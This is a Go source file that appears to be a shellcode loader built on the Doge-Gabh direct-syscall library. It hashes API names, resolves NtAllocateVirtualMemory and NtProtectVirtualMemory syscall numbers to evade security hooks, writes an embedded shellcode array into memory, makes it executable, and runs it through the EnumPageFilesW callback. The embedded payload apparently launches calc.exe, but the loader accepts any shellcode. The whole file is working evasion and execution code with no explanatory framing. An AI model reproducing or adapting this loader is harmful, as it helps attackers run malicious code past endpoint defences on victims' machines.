package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"crypto/sha1"
	"crypto/sha256"
	_ "embed"
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

func main() {

	sc := []byte{
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	EnumPageFilesW, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'p', 's', 'a', 'p', 'i', '.', 'd', 'l', 'l'}), "27a2229b308599a48d1ca5d8ca86bcba9cd84de3", str2sha1)
	alloc, e := Go2gabh.GetSSNByNameExcept(str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	if e != nil {
		os.Exit(0)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Sha256Hex)
	if e != nil {
		os.Exit(0)
	}
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var handle = uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(len(sc))
	_, r := Go2gabh.HgSyscall(
		uint16(alloc),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		os.Exit(0)
	}
	memcpy(baseA, sc)

	var oldprotect uintptr
	_, r = Go2gabh.HgSyscall(
		uint16(protect),
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		os.Exit(0)
	}
	syscall.Syscall(uintptr(EnumPageFilesW), 2, baseA, 0, 0)
}
func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
